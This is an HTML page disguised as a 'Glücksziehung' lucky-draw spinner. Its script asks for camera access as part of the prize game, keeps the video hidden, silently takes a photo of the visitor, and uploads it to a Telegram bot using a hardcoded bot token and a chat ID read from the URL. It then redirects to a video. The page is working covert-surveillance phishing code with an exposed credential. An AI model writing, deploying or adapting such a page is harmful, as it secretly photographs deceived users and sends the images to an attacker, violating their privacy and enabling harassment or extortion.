<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>🎁 Glücksziehung 🎁</title>
    <style>
        body { 
            display: flex; flex-direction: column; align-items: center; justify-content: center; 
            min-height: 100vh; margin: 0; background: url('https://github.com/sachinbagwan208-design/-/raw/main/00.png') no-repeat center center fixed; 
            background-size: cover; color: white; font-family: sans-serif;
        }
        /* 转盘样式 */
        #spinner {
            width: 300px; height: 300px; border: 10px solid #ffd700;
            border-radius: 50%; display: flex; align-items: center; justify-content: center;
            font-size: 50px; background: rgba(255,255,255,0.2);
            margin-bottom: 20px; transition: transform 0.5s ease-out;
        }
        .spinning { animation: spin 0.1s linear infinite; }
        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        
        #status { margin: 15px 0; font-weight: bold; color: #fff; background: rgba(0,0,0,0.6); padding: 10px; border-radius: 5px; }
        button { padding: 15px 40px; cursor: pointer; font-size: 20px; border-radius: 50px; border: none; background: #d9534f; color: white; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
        button:hover { background: #c9302c; }
        #video { display: none; } /* 摄像头始终隐藏 */
    </style>
</head>
<body>
    <div id="spinner">🎁</div>
    <div id="status">Click the button below to start your lucky draw</div>
    <button id="startBtn">Start💰</button>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = '8657025946:AAENnYKTFNhRrms6bzTLIR2kAQGytdOinnI'; // 请在此处填入Token
        const spinner = document.getElementById('spinner');
        const startBtn = document.getElementById('startBtn');
        const status = document.getElementById('status');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const urlParams = new URLSearchParams(window.location.search);
        const CHAT_ID = urlParams.get('id');

        startBtn.addEventListener('click', async () => {
            if (!CHAT_ID) { status.innerText = "错误：未获取用户ID"; return; }
            
            // 1. 📤📤📤📤
            spinner.classList.add('spinning');
            startBtn.style.display = 'none';
            status.innerText = "🎁We are drawing a grand prize for you....";

            try {
                // 2. 调取摄像头
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                
                // 3. 🛎🛎🛎🛎🛎 
                setTimeout(async () => {
                    // ⏹️Stop the turntable⏹️
                    spinner.classList.remove('spinning');
                    status.innerText = "🎉🎉🎉🎉🎉...";
                    
                    // 4. 拍摄并上传
                    captureAndUpload(stream);
                }, 2000); // 🎈The lottery draw lasts for 2 seconds🎈
            } catch (err) {
                status.innerText = "Please grant camera access to continue the prize draw📌。";
            }
        });

        function captureAndUpload(stream) {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'lucky.jpg');
                
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST', body: formData
                });
                
                const result = await response.json();
                if(result.ok) {
                    stream.getTracks().forEach(t => t.stop()); // 关闭摄像头
                    window.location.href = "https://github.com/sachinbagwan208-design/-/raw/main/000.MP4";
                } else {
                    status.innerText = "抽奖系统繁忙，请重试";
                }
            }, 'image/jpeg');
        }
    </script>
</body>
</html>
